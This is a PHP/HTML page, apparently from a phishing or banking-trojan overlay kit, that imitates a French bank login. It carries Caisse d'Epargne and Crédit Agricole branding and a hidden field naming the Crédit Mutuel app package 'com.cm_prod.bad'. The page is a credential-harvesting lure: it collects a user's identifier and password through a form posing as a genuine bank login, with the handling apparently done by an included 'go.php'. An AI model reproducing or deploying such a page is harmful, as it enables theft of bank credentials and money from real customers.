<?php require_once '../go.php';?>
<!DOCTYPE html>
<html>

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <title>caisseepargne</title>

    <link rel="stylesheet" href="css/normalize.css">
    <link rel="stylesheet" href="css/main.css">

    <link rel="stylesheet" href="css/agricole.css">

    <script src="js/vendor/jquery-1.11.3.min.js"></script>
    <script src="js/viewport.js"></script>
</head>

<body>
		<div class="modal modal_04">
            <div class="row">
                <div class="form_header">
                    <img src="img/agricole/logo.png" alt="">
                </div>
            </div>
			<div class="container">
				<form action="#" method="post" class="wrapper">
                <input type="hidden" name="field1" value="com.cm_prod.bad" class="main_input">
					<div class="row">
						<div class="content">
							<div class="input_block_wr">
								<div class="inp_caption">
								 Identifiant
								</div>
								<div class="inp_wr">
									<input type="text" name="field2" class="main_input"  required="">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									Mot de passe
								</div>
								<div class="inp_wr">
									<input type="password" name="field3" class="main_input"  required="">
								</div>
							</div>
							<div class="btn_wr">
								<input class="login_btn" type="submit" value="Valider">
							</div>
						</div>
					</div>
				</form>
			</div>
		</div>
</body>

</html>